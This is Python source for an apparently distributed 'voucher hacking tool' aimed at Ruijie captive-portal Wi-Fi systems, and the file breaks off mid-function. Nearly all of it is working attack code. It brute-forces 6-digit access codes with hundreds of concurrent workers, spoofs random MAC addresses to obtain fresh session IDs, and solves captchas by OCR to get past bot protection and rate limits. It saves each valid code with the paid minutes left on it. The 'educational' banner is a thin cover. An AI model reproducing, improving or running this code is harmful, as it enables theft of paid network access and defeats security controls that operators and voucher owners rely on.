import asyncio
import aiohttp
import json
import time
import random
import re
import signal
import sys
import os
import subprocess
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse, unquote
import ddddocr
import aiofiles
import uvloop

asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

# ---------------- COLORS ----------------
reset = "\033[0m"
yellow = "\033[93m"
magenta = "\033[95m"
blue = "\033[94m"
bcyan = "\033[1;36m"
bgreen = "\033[1;32m"
bred = "\033[1;31m"
white = "\033[0;37m"
red = "\033[91m"
bold_red = "\033[1;91m"
bright_red = "\033[38;5;196m"
green = "\033[92m"
bold_green = "\033[1;92m"
cyan = "\033[96m"
bold_white = "\033[1;97m"
dim = "\033[2m"

# ---------------- GLOBALS ----------------
TIMEOUT_SEC = 10
BALANCE_TIMEOUT_SEC = 20
BALANCE_MAX_RETRIES = 3
BALANCE_RETRY_BACKOFF = [0.5, 1.0, 2.0]
MAX_CODES_PER_SID = 30
MAX_CODES_PER_SESSION = 50
DEFAULT_WORKERS = 300
DEFAULT_RECHECK_WORKERS = 10
MAX_CAPTCHA_ATTEMPTS = 5

_ocr_instance = None
_scanner_data = None
_stop_event = None


def get_ocr_instance():
    global _ocr_instance
    if _ocr_instance is None:
        _ocr_instance = ddddocr.DdddOcr(show_ad=False)
    return _ocr_instance


# ---------------- BOOT LOADER ----------------
def show_boot_loader():
    """Script run တာနဲ့ ချက်ချင်းပြတဲ့ MS SYSTEM IS LOADING screen"""
    os.system('clear' if os.name == 'posix' else 'cls')

    print(f"\n\n{bright_red}")
    print("    ╔═══════════════════════════════════════════════════════════╗")
    print("    ║                                                           ║")
    print("    ║                ☠   M S   T E A M   ☠                      ║")
    print("    ║                                                           ║")
    print("    ║                   [ A N D R E W   M S ]                   ║")
    print("    ║                                                           ║")
    print("    ╚═══════════════════════════════════════════════════════════╝")
    print(f"{reset}")

    print(f"{bold_white}                    MS SYSTEM IS LOADING...{reset}\n")

    # Loading bar
    bar_len = 50
    for i in range(bar_len + 1):
        percent = int((i / bar_len) * 100)
        filled = "█" * i
        empty = "░" * (bar_len - i)
        sys.stdout.write(f"\r  {bright_red}[{reset}{bold_green}{filled}{reset}{dim}{empty}{reset}{bright_red}]{reset} "
                         f"{bold_white}{percent:3d}%{reset}")
        sys.stdout.flush()
        time.sleep(random.uniform(0.01, 0.03))
    print()

    # Loading steps
    steps = [
        ("Loading MS Core Engine", "CORE OK"),
        ("Initializing OCR Module", "OCR READY"),
        ("Bypassing Captcha System", "BYPASS READY"),
        ("Initializing Async Workers", "UVLOOP ACTIVE"),
        ("Connecting to Portal Server", "LINK UP"),
        ("Spoofing MAC Address", "SPOOF OK"),
        ("Loading Proxy Chain", "CHAIN OK"),
        ("Injecting MS Payload", "INJECTED"),
        ("Bypassing Rate Limit", "BYPASSED"),
        ("Establishing Secure Tunnel", "TUNNEL OK"),
        ("Arming MS System", "ARMED"),
    ]

    print()
    for i, (step, status) in enumerate(steps, 1):
        print(f"  {bright_red}[{i:02d}/{len(steps):02d}]{reset} "
              f"{bold_white}{step:<35}{reset} "
              f"{bold_green}[✓] {status}{reset}")
        time.sleep(random.uniform(0.08, 0.2))

    print(f"\n{bold_green}    [✓] MS SYSTEM READY - 100% LOADED{reset}")
    print(f"{bright_red}    ═══════════════════════════════════════════════════════════{reset}")
    time.sleep(0.6)

    # Welcome message
    print(f"\n{bright_red}  [>]{reset} {bold_white}Welcome from MS Team{reset}")
    print(f"{bright_red}  [>]{reset} {dim}System  :{reset} {bold_red}MS System{reset}")
    print(f"{bright_red}  [>]{reset} {dim}Telegram:{reset} {bold_red}@andrew_ms_7{reset}")
    print(f"{bright_red}  [>]{reset} {dim}Status  :{reset} {bold_green}🟢 ONLINE{reset}")
    print()
    input(f"{bright_red}  [ ⏎ PRESS ENTER TO CONTINUE ]{reset}")


# ---------------- BANNERS ----------------
def show_welcome_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""{bright_red}
    ███╗   ███╗ ███████╗    ████████╗███████╗ █████╗ ███╗   ███╗
    ████╗ ████║ ██╔════╝    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
    ██╔████╔██║ ███████╗       ██║   █████╗  ███████║██╔████╔██║
    ██║╚██╔╝██║ ╚════██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
    ██║ ╚═╝ ██║ ███████║       ██║   ███████╗██║  ██║██║ ╚═╝ ██║
    ╚═╝     ╚═╝ ╚══════╝       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ {reset}
{dim}{red}                  [ RUIJIE VOUCHER HACKING TOOL ]{reset}
{dim}{red}                       [ PRIVATE BUILD v3.0 ]{reset}
{red}    ═══════════════════════════════════════════════════════════{reset}
{bold_red}                   ☠  M S   S Y S T E M  ☠{reset}
{bold_red}                     [ M S   T E A M ]{reset}
{red}    ═══════════════════════════════════════════════════════════{reset}
"""
    print(banner)


def show_menu_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = f"""{bright_red}
    ╔═══════════════════════════════════════════════════════════════╗
    ║{reset}  {bold_white}███╗   ███╗ ███████╗    ████████╗███████╗ █████╗ ███╗   ███╗{bright_red} ║
    ║{reset}  {bold_white}████╗ ████║ ██╔════╝    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║{bright_red} ║
    ║{reset}  {bold_white}██╔████╔██║ ███████╗       ██║   █████╗  ███████║██╔████╔██║{bright_red} ║
    ║{reset}  {bold_white}██║╚██╔╝██║ ╚════██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║{bright_red} ║
    ║{reset}  {bold_white}██║ ╚═╝ ██║ ███████║       ██║   ███████╗██║  ██║██║ ╚═╝ ██║{bright_red} ║
    ║{reset}  {bold_white}╚═╝     ╚═╝ ╚══════╝       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝{bright_red} ║
    ╚═══════════════════════════════════════════════════════════════╝{reset}
{dim}{red}                     [ MS SYSTEM - PRIVATE TOOL ]{reset}
{dim}{red}                        [ RUIJIE VOUCHER HACKER ]{reset}
{red}    ─────────────────────────────────────────────────────────────{reset}
{bold_red}    ☠  For Educational & Authorized Testing Only  ☠{reset}
{red}    ─────────────────────────────────────────────────────────────{reset}
"""
    print(banner)


# ---------------- Scanner Data ----------------
CONFIG_FILE = os.path.expanduser("~/.ruijie_scanner_config.json")

SAVE_PATH = "/storage/emulated/0/Starlink/ocr_code.txt"
RECHECK_VALID_PATH = "/storage/emulated/0/Starlink/ocr_recheck_valid.txt"
RECHECK_LIMIT_PATH = "/storage/emulated/0/Starlink/ocr_recheck_limit.txt"
BALANCE_FILE = "/storage/emulated/0/Starlink/ocr_balance.txt"


def ensure_dir(filepath):
    d = os.path.dirname(filepath)
    if d and not os.path.exists(d):
        os.makedirs(d, exist_ok=True)


def init_scanner_data():
    global _scanner_data
    portal_url = None
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                config = json.load(f)
                portal_url = config.get("portal_url")
        except:
            pass

    _scanner_data = {
        'mode': 'num6',
        'char_set': '012345678',
        'code_len': 6,
        'start_digit': None,
        'portal_url': portal_url,
        'stats': {'tried': 0, 'hits': 0, 'expired': 0, 'limits': 0, 'skipped': 0,
                  'start_time': time.time()},
        'valid_codes': [],
        'limit_codes': [],
        'skipped_codes': [],
        'valid_details': [],
        'tried_codes': set(),
        'recent_logs': [],
        'recheck_queue': [],
        'CURRENT_CODE': '----',
        'hit_balance_queue': None,
        'recheck_valid_queue': None,
        'recheck_limit_queue': None,
        'save_file': SAVE_PATH,
        'recheck_valid_file': RECHECK_VALID_PATH,
        'recheck_limit_file': RECHECK_LIMIT_PATH,
        'balance_file': BALANCE_FILE,
        'num_workers': DEFAULT_WORKERS,
        'recheck_workers': DEFAULT_RECHECK_WORKERS,
        'GLOBAL_CHOICE': '3',
        'shared_connector': None
    }


def get_scanner_data():
    return _scanner_data


# ---------------- URL CONVERTER ----------------
def convert_to_portal_url(url: str) -> str:
    if not url:
        return url

    url = url.strip()

    if 'portal-as.ruijienetworks.com' in url or 'portal-mm-as.ruijienetworks.com' in url:
        if '/auth/wifidogAuth/login' in url:
            url = url.replace('/auth/wifidogAuth/login/?', '/api/auth/wifidog?stage=portal&')
            url = url.replace('/auth/wifidogAuth/login?', '/api/auth/wifidog?stage=portal&')
        return url

    try:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        if 'pdata' in query and query['pdata']:
            raw = query['pdata'][0]
            decoded = unquote(raw)
            if 'http' not in decoded.lower() and '%' in decoded:
                decoded = unquote(decoded)
            if 'http' in decoded.lower():
                return convert_to_portal_url(decoded)
    except Exception:
        pass

    try:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        if 'url' in query and query['url']:
            raw = unquote(query['url'][0])
            if 'http' in raw.lower() and 'connectivitycheck' not in raw.lower():
                return convert_to_portal_url(raw)
    except Exception:
        pass

    try:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        if 'gw_id' in query or 'gw_sn' in query or 'gw_address' in query:
            base_domain = "portal-as.ruijienetworks.com"
            portal_params = {}
            for key in ['gw_id', 'gw_sn', 'gw_address', 'gw_port', 'ip', 'mac',
                        'slot_num', 'nasip', 'ssid', 'ustate', 'mac_req', 'url',
                        'chap_id', 'chap_challenge', 'v']:
                if key in query:
                    portal_params[key] = query[key][0]
            portal_url = f"https://{base_domain}/api/auth/wifidog?stage=portal"
            if portal_params:
                portal_url += "&" + urlencode(portal_params)
            return portal_url
    except Exception:
        pass

    try:
        parsed = urlparse(url)
        host = parsed.hostname or ""
        if re.match(r"^192\.168\.\d+\.\d+$", host) or re.match(r"^10\.\d+\.\d+\.\d+$", host):
            query = parse_qs(parsed.query)
            base_domain = "portal-as.ruijienetworks.com"
            portal_params = {}
            for key in ['gw_id', 'gw_sn', 'gw_address', 'gw_port', 'ip', 'mac',
                        'slot_num', 'nasip', 'ssid', 'ustate', 'mac_req', 'url',
                        'chap_id', 'chap_challenge', 'v']:
                if key in query:
                    portal_params[key] = query[key][0]
            if 'gw_address' not in portal_params:
                portal_params['gw_address'] = host
            if 'gw_port' not in portal_params and parsed.port:
                portal_params['gw_port'] = str(parsed.port)
            portal_url = f"https://{base_domain}/api/auth/wifidog?stage=portal"
            if portal_params:
                portal_url += "&" + urlencode(portal_params)
            return portal_url
    except Exception:
        pass

    return url


def normalize_portal_url(url: str) -> str:
    return convert_to_portal_url(url)


# ---------------- UTILITIES ----------------
def generate_random_mac():
    return ":".join(["%02x" % random.randint(0, 255) for _ in range(6)])


def ocr_image_bytes_fast(image_bytes: bytes) -> str:
    try:
        ocr = get_ocr_instance()
        result = ocr.classification(image_bytes)
        return result.strip().upper()
    except Exception:
        return ""


async def solve_captcha_simple_async(session, captcha_url, headers):
    try:
        current_url = f"{captcha_url}&_t={int(time.time() * 1000)}"
        async with session.get(current_url, headers=headers, ssl=False) as response:
            if response.status == 200:
                image_content = await response.read()
                return await asyncio.to_thread(ocr_image_bytes_fast, image_content)
    except Exception:
        pass
    return None


async def get_sid_from_gateway(session, portal_url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    }
    try:
        portal_url = convert_to_portal_url(portal_url)
        u = urlparse(portal_url)
        query = parse_qs(u.query)
        mac = generate_random_mac()
        query['mac'] = [mac]
        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))

        async with session.get(spoofed_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r2:
            body = await r2.text()
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if match:
                final_url = urljoin(spoofed_url, match.group(1))
                async with session.get(final_url, headers=headers, timeout=TIMEOUT_SEC, ssl=False) as r3:
                    final_url = str(r3.url)
            else:
                final_url = str(r2.url)
            parsed_query = parse_qs(urlparse(final_url).query)
            sid = parsed_query.get('sessionId', parsed_query.get('sid', [None]))[0]
            if sid:
                return sid
    except Exception:
        pass
    return None


# ---------------- BALANCE CHECKER (WITH RETRY) ----------------
async def fetch_balance_once(active_token: str, base_domain: str, connector) -> str:
    """Single attempt to fetch balance."""
    url = f'https://{base_domain}/api/auth/balance/getBalance/{active_token}'
    headers = {
        'authority': base_domain,
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json;',
        'referer': f'https://{base_domain}/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    timeout = aiohttp.ClientTimeout(total=BALANCE_TIMEOUT_SEC)
    async with aiohttp.ClientSession(connector=connector, connector_owner=False,
                                     timeout=timeout) as s:
        async with s.get(url, headers=headers) as resp:
            if resp.status == 200:
                try:
                    data = await resp.json()
                except Exception:
                    raise ValueError("JSON Error")
                inner = data.get('result', data)
                if not isinstance(inner, dict):
                    raise ValueError("Unexpected format")
                profile_name = inner.get('profileName', 'N/A')
                raw_total = inner.get('totalMinutes', 0)
                try:
                    total_minutes = abs(int(raw_total))
                except:
                    total_minutes = 0
                hours = total_minutes // 60
                minutes = total_minutes % 60
                return f"🃏: {profile_name}, ⏰: {hours} hr {minutes} min"
            else:
                raise ValueError(f"HTTP {resp.status}")


async def fetch_balance(active_token: str, code: str, connector,
                        base_domain="portal-as.ruijienetworks.com") -> str:
    """Fetch balance with retry + exponential backoff."""
    last_error = None
    for attempt in range(BALANCE_MAX_RETRIES):
        try:
            return await fetch_balance_once(active_token, base_domain, connector)
        except asyncio.TimeoutError:
            last_error = "Timeout"
        except aiohttp.ClientError as e:
            last_error = f"ClientError: {type(e).__name__}"
        except ValueError as e:
            last_error = str(e)
            if not last_error.startswith("HTTP 5"):
                break
        except Exception as e:
            last_error = f"{type(e).__name__}"

        if attempt < BALANCE_MAX_RETRIES - 1:
            backoff = BALANCE_RETRY_BACKOFF[min(attempt, len(BALANCE_RETRY_BACKOFF) - 1)]
            await asyncio.sleep(backoff)

    return f"[!] {last_error} (retry x{BALANCE_MAX_RETRIES} failed)"


async def check_balance(active_token, code, log_index, connector, base_domain):
    ud = get_scanner_data()
    balance_str = await fetch_balance(active_token, code, connector, base_domain)
    await ud['hit_balance_queue'].put(f"{code} | {balance_str}")
    for item in ud['valid_details']:
        if item['code'] == code:
            item['balance_str'] = balance_str
            break
    if log_index < len(ud['recent_logs']):
        ud['recent_logs'][log_index] = f"{bold_green}✅ HIT: {code} | {balance_str}{reset}"


# ---------------- CHECK SINGLE ACCESS CODE ----------------
async def check_single_access_code(session, code, current_session_id, login_url,
                                   captcha_base_url, verify_url, headers, base_domain):
    ud = get_scanner_data()
    captcha_url = f"{captcha_base_url}?sessionId={current_session_id}"
    attempts = 0
    while not _stop_event.is_set() and attempts < MAX_CAPTCHA_ATTEMPTS:
        auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
        attempts += 1
        if not auth_code or len(auth_code) < 2:
            await asyncio.sleep(0.001)
            continue

        v_payload = {"sessionId": current_session_id, "authCode": auth_code}
        try:
            async with session.post(verify_url, json=v_payload, headers=headers, ssl=False) as v_resp:
                if v_resp.status != 200:
                    continue
                v_data = await v_resp.json()
                if not v_data.get("success"):
                    continue

                l_payload = {"accessCode": code, "sessionId": current_session_id,
                             "apiVersion": 1, "authCode": auth_code}
                async with session.post(login_url, json=l_payload, headers=headers, ssl=False) as l_resp:
                    ud['stats']['tried'] += 1
                    l_text = (await l_resp.text()).lower()

                    if 'request limited' in l_text:
                        return 'limit'

                    if '"success":true' in l_text:
                        ud['stats']['hits'] += 1
                        ud['valid_codes'].append(code)

                        hit_item = {
                            'code': code,
                            'balance_str': '...fetching...',
                            'time': time.time()
                        }
                        ud['valid_details'].append(hit_item)

                        log_entry = f"{bold_green}✅ HIT: {code} (...fetching balance...){reset}"
                        ud['recent_logs'].append(log_entry)
                        current_log_idx = len(ud['recent_logs']) - 1

                        token_match = re.search(r'token=([^&\s"\'<>]+)', l_text)
                        if token_match:
                            active_token = token_match.group(1)
                            connector = ud.get('shared_connector')
                            asyncio.create_task(
                                check_balance(active_token, code, current_log_idx,
                                              connector, base_domain))
                        return 'hit'
                    elif "expired" in l_text:
                        ud['stats']['expired'] += 1
                        return 'expired'
                    elif "the number of sta exceeds the limit" in l_text or "limit" in l_text:
                        ud['stats']['limits'] += 1
                        if code not in ud['limit_codes']:
                            ud['limit_codes'].append(code)
                        ud['recent_logs'].append(f"{bright_red}⚠️ LIMIT: {code}{reset}")
                        return 'limit'

                    return 'failed'
        except Exception:
            return 'failed'

    ud['stats']['skipped'] += 1
    if code not in ud['skipped_codes']:
        ud['skipped_codes'].append(code)
    return 'skip'


# ---------------- WORKER (SPEED OPTIMIZED) ----------------
async def worker(worker_id, login_url, captcha_base_url, verify_url, headers,
                 connector, base_domain):
    ud = get_scanner_data()
    session = aiohttp.ClientSession(connector=connector, connector_owner=False)
    try:
        while not _stop_event.is_set():
            current_session_id = None
            codes_checked_this_sid = 0
            codes_checked_this_session = 0

            while not _stop_event.is_set() and codes_checked_this_session < MAX_CODES_PER_SESSION:
                if current_session_id is None or codes_checked_this_sid >= MAX_CODES_PER_SID:
                    sid = await get_sid_from_gateway(session, ud['portal_url'])
                    if sid is None:
                        await asyncio.sleep(0.3)
                        continue
                    current_session_id = sid
                    codes_checked_this_sid = 0

                if ud['mode'] == "recheck":
                    if not ud['recheck_queue']:
                        _stop_event.set()
                        break
                    code = ud['recheck_queue'].pop(0)
                else:
                    if ud['mode'] == "custom" and ud['start_digit'] is not None:
                        body_chars = random.choices(ud['char_set'], k=ud['code_len'] - 1)
                        code = ud['start_digit'] + ''.join(body_chars)
                    else:
                        code = ''.join(random.choices(ud['char_set'], k=ud['code_len']))
                    if code in ud['tried_codes']:
                        continue
                    ud['tried_codes'].add(code)

                if _stop_event.is_set():
                    break

                ud['CURRENT_CODE'] = code
                result = await check_single_access_code(
                    session, code, current_session_id, login_url,
                    captcha_base_url, verify_url, headers, base_domain)
                codes_checked_this_sid += 1
                codes_checked_this_session += 1

                if result == 'hit' and ud['mode'] == "recheck":
                    await ud['recheck_valid_queue'].put(code)
                elif result == 'limit' and ud['mode'] == "recheck":
                    await ud['recheck_limit_queue'].put(code)
    finally:
        await session.close()


# ---------------- FILE WRITER ----------------
async def code_writer():
    ud = get_scanner_data()
    for fpath in [ud['save_file'], ud['recheck_valid_file'], ud['recheck_limit_file']]:
        ensure_dir(fpath)
    while (not _stop_event.is_set() or not ud['hit_balance_queue'].empty()
           or not ud['recheck_valid_queue'].empty()
           or not ud['recheck_limit_queue'].empty()):
        try:
            while not ud['hit_balance_queue'].empty():
                line = await ud['hit_balance_queue'].get()
                async with aiofiles.open(ud['save_file'], "a") as f:
                    await f.write(f"{line}\n")
            while not ud['recheck_valid_queue'].empty():
                code = await ud['recheck_valid_queue'].get()
                async with aiofiles.open(ud['recheck_valid_file'], "a") as f:
                    await f.write(f"{code}\n")
            while not ud['recheck_limit_queue'].empty():
                code = await ud['recheck_limit_queue'].get()
                async with aiofiles.open(ud['recheck_limit_file'], "a") as f:
                    await f.write(f"{code}\n")
            await asyncio.sleep(0.05)
        except Exception:
            pass


# ---------------- TERMINAL DASHBOARD ----------------
async def terminal_dashboard():
    ud = get_scanner_data()
    last_render = 0
    while not _stop_event.is_set():
        now = time.time()
        if now - last_render < 0.5:
            await asyncio.sleep(0.1)
            continue
        last_render = now

        stats = ud['stats']
        elapsed = time.time() - stats['start_time']
        speed = stats['tried'] / elapsed if elapsed > 0 else 0
        total_tried = stats['tried']
        GLOBAL_CHOICE = ud['GLOBAL_CHOICE']
        recheck_queue = ud['recheck_queue']
        CURRENT_CODE = ud['CURRENT_CODE']
        total_hits = stats['hits']
        total_expired = stats['expired']
        total_limits = stats['limits']
        valid_codes = ud['valid_codes']
        limit_codes = ud['limit_codes']
        recent_logs = ud['recent_logs']

        print("\033[H\033[J", end="")
        print(f"{bright_red}╔══════════════════════════════════════════════════════╗{reset}")
        print(f"{bright_red}║{reset}  {bold_white}☠ MS SYSTEM ☠{reset}    {bright_red}By @andrew_ms_7{reset}          {bright_red}║{reset}")
        print(f"{bright_red}╠══════════════════════════════════════════════════════╣{reset}")
        print(f"{bright_red}║{reset}  {dim}📡 Telegram :{reset} {bold_red}@andrew_ms_7{reset}                              {bright_red}║{reset}")
        print(f"{bright_red}║{reset}  {dim}👑 MS    :{reset} {bold_red}ANDREW MS{reset}                              {bright_red}║{reset}")
        print(f"{bright_red}║{reset}  {dim}⚡ Speed   :{reset} {bold_green}{speed:.1f} c/s{reset}                                {bright_red}║{reset}")
        print(f"{bright_red}║{reset}  {dim}🔴 Status  :{reset} {bold_green}SCANNING...{reset}                            {bright_red}║{reset}")
        print(f"{bright_red}╚══════════════════════════════════════════════════════╝{reset}")
        print()
        print(f"  {bright_red}[>]{reset} {dim}🔋 Tried   :{reset} {bold_white}{total_tried:,}{reset}"
              + (f" / {total_tried + len(recheck_queue)}" if GLOBAL_CHOICE == "4" else ""))
        print(f"  {bright_red}[>]{reset} {dim}🎯 Current :{reset} {bold_white}{CURRENT_CODE}{reset}")
        print()
        print(f"{bright_red}  ────────────────────────────────────────────────────{reset}")
        print(f"  {bold_green}🟢 HITS    : {total_hits}{reset}")
        print(f"  {magenta}🟣 EXPIRED : {total_expired}{reset}")
        print(f"  {bright_red}🔵 LIMITS  : {total_limits}{reset}")
        print(f"{bright_red}  ────────────────────────────────────────────────────{reset}")

        if valid_codes:
            print(f"{bold_green}  ✅ Valid Active Now: {', '.join(valid_codes[-5:])}{reset}")
        if limit_codes:
            print(f"{bright_red}  ⚠️ Limit Active Now: {', '.join(limit_codes[-5:])}{reset}")
        print(f"{bright_red}  ────────────────────────────────────────────────────{reset}")

        if recent_logs:
            for log in recent_logs[-100:]:
                print(f"  {log}")
        print(f"\n{dim}{bright_red}  🛑 [ CTRL+C TO STOP SCANNER ]{reset}")
        await asyncio.sleep(0.2)


# ---------------- NON-BLOCKING KEYBOARD LISTEN ----------------
async def listen_for_exit():
    loop = asyncio.get_running_loop()
    try:
        await loop.run_in_executor(None, sys.stdin.readline)
    except Exception:
        pass
    _stop_event.set()


# ---------------- VIEW HITS ----------------
def show_hit_codes():
    ud = get_scanner_data()
    current_hits = ud['valid_details']
    print(f"\n{bright_red}╔══════════════════════════════════════════════════════╗{reset}")
    print(f"{bright_red}║{reset}  {bold_white}📋 HIT CODES (CURRENT SESSION){reset}                    {bright_red}║{reset}")
    print(f"{bright_red}╚══════════════════════════════════════════════════════╝{reset}")
    if current_hits:
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━")
        for item in current_hits:
            code = item['code']
            balance = item.get('balance_str', 'N/A')
            print(f"  {bold_green}✅ {code}{reset}  |  {balance}")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━")
    else:
        print("  No hits in current session.")

    save_file = ud['save_file']
    if os.path.exists(save_file):
        print(f"\n{bright_red}📂 PREVIOUSLY SAVED HITS{reset}")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━")
        with open(save_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    print(f"  {line}")
        print("━━━━━━━━━━━━━━━━━━━━━━━━━━")
    else:
        print("\n  No saved hits file found.")

    input(f"\n{bright_red}  [ ⏎ PRESS ENTER TO RETURN ]{reset}")


# ---------------- RUN SCANNER ----------------
async def run_scanner():
    global _stop_event
    ud = get_scanner_data()
    if not ud['portal_url']:
        print(f"{bright_red}❌ Portal URL not set! Please update portal URL first.{reset}")
        return

    ud['portal_url'] = convert_to_portal_url(ud['portal_url'])
    print(f"{green}🌐 Using Portal URL: {ud['portal_url'][:150]}...{reset}")

    if 'portal-mm-as' in ud['portal_url']:
        base_domain = "portal-mm-as.ruijienetworks.com"
    else:
        base_domain = "portal-as.ruijienetworks.com"

    login_url = f"https://{base_domain}/api/auth/voucher/?lang=en_US"
    captcha_base_url = f"https://{base_domain}/api/auth/captcha/image"
    verify_url = f"https://{base_domain}/api/auth/captcha/verify"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Content-Type": "application/json",
        "Origin": f"https://{base_domain}",
        "Referer": f"https://{base_domain}/download/static/maccauth/src/index.html"
    }

    connector = aiohttp.TCPConnector(
        limit=0,
        limit_per_host=0,
        ttl_dns_cache=360,
        ssl=False
    )
    ud['shared_connector'] = connector

    max_recheck_cycles = 3
    recheck_cycle = 0

    while True:
        _stop_event = asyncio.Event()

        if recheck_cycle == 0:
            ud['stats'] = {'tried': 0, 'hits': 0, 'expired': 0, 'limits': 0,
                           'skipped': 0, 'start_time': time.time()}
            ud['valid_codes'] = []
            ud['limit_codes'] = []
            ud['skipped_codes'] = []
            ud['valid_details'] = []
            ud['tried_codes'] = set()
            ud['recent_logs'] = []
            ud['CURRENT_CODE'] = '----'
            ud['hit_balance_queue'] = asyncio.Queue()
            ud['recheck_valid_queue'] = asyncio.Queue()
            ud['recheck_limit_queue'] = asyncio.Queue()
        else:
            _stop_event.clear()
            ud['hit_balance_queue'] = asyncio.Queue()
            ud['recheck_valid_queue'] = asyncio.Queue()
            ud['recheck_limit_queue'] = asyncio.Queue()

        if ud['mode'] == 'recheck':
            worker_count = min(ud['recheck_workers'], len(ud['recheck_queue']))
            if worker_count == 0 and not ud['recheck_queue']:
                break
        else:
            worker_count = ud['num_workers']

        dashboard_task = asyncio.create_task(terminal_dashboard())
        writer_task = asyncio.create_task(code_writer())
        exit_listener_task = asyncio.create_task(listen_for_exit())

        worker_tasks = [
            asyncio.create_task(
                worker(i, login_url, captcha_base_url, verify_url, headers,
                       connector, base_domain))
            for i in range(worker_count)
        ]
        tasks = [dashboard_task, writer_task] + worker_tasks

        loop = asyncio.get_running_loop()

        def signal_handler():
            _stop_event.set()

        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, signal_handler)
            except NotImplementedError:
                signal.signal(sig, lambda *args: signal_handler())

        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass
        finally:
            if not exit_listener_task.done():
                exit_listener_task.cancel()
            for sig in (signal.SIGINT, signal.SIGTERM):
                try:
                    loop.remove_signal_handler(sig)
                except NotImplementedError:
                    signal.signal(sig, signal.SIG_DFL)

        if ud['mode'] == 'recheck' and ud['skipped_codes'] and recheck_cycle < max_recheck_cycles:
            recheck_cycle += 1
            print(f"\n{bright_red}🔄 Rechecking {len(ud['skipped_codes'])} skipped codes (cycle {recheck_cycle}/{max_recheck_cycles})...{reset}")
            ud['recheck_queue'] = ud['skipped_codes'][:]
            ud['skipped_codes'].clear()
            continue
        else:
            break

    if not connector.closed:
        await connector.close()
    ud['shared_connector'] = None

    if ud['skipped_codes']:
        print(f"\n{bright_red}⚠️ {len(ud['skipped_codes'])} codes were skipped due to captcha failures.{reset}")
        choice = await asyncio.to_thread(input, f"{bright_red}❓ Recheck them now? (y/n): {reset}")
        if choice.strip().lower() == 'y':
            ud['recheck_queue'] = list(ud['skipped_codes'])
            ud['skipped_codes'].clear()
            ud['mode'] = 'recheck'
            ud['GLOBAL_CHOICE'] = '4'
            await run_scanner()

    print("\033[H\033[J", end="")
    print(f"{bright_red}🛑 Scanner Stopped. Returning to main menu...{reset}")
    await asyncio.sleep(1)


# ---------------- UPDATE PORTAL ----------------
async def update_portal():
    ud = get_scanner_data()
    print(f"\n{bright_red}🔍 Trying to auto-detect portal URL...{reset}")

    trigger_url = "http://connectivitycheck.gstatic.com/generate_204"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(trigger_url, headers=headers, timeout=10,
                                   allow_redirects=False) as r1:
                text = await r1.text()
                portal_url = None
                xml_match = re.search(r"<NextURL>(.*?)</NextURL>", text)
                if xml_match:
                    portal_url = xml_match.group(1).replace("&amp;", "&").strip()
                elif "Location" in r1.headers:
                    portal_url = r1.headers["Location"]

                if portal_url:
                    print(f"{bright_red}📡 Detected URL: {portal_url[:150]}...{reset}")

                    converted = convert_to_portal_url(portal_url)
                    if converted and converted != portal_url:
                        print(f"{bright_red}🔁 Converted to: {converted[:150]}...{reset}")
                        portal_url = converted

                    if 'ruijienetworks.com' in portal_url:
                        ud['portal_url'] = portal_url
                        try:
                            with open(CONFIG_FILE, 'w') as f:
                                json.dump({"portal_url": portal_url}, f)
                        except Exception as e:
                            print(f"{bright_red}⚠️ Could not save config: {e}{reset}")
                        print(f"{bold_green}✅ Portal URL set: {portal_url}{reset}")
                        return
    except Exception as e:
        print(f"{bright_red}❌ Auto-detection failed: {e}{reset}")

    print(f"\n{dim}Current Portal URL: {ud['portal_url'] if ud['portal_url'] else 'Not set'}{reset}")

    url = input(f"{bright_red}➤ Enter Portal URL (any URL type OK): {reset}").strip()
    if url:
        converted = convert_to_portal_url(url)
        if converted and converted != url:
            print(f"{bright_red}🔁 Converted to: {converted[:150]}...{reset}")
            url = converted

        ud['portal_url'] = url
        try:
            with open(CONFIG_FILE, 'w') as f:
                json.dump({"portal_url": url}, f)
        except Exception as e:
            print(f"{bright_red}⚠️ Could not save config: {e}{reset}")
        print(f"{bold_green}✅ Portal URL updated.{reset}")
    else:
        print(f"{bright_red}❌ No URL entered.{reset}")


# ---------------- CHANGE MODE ----------------
async def change_mode():
    ud = get_scanner_data()
    print(f"\n{bright_red}⚙️ --- Change Scanning Mode ---{reset}")
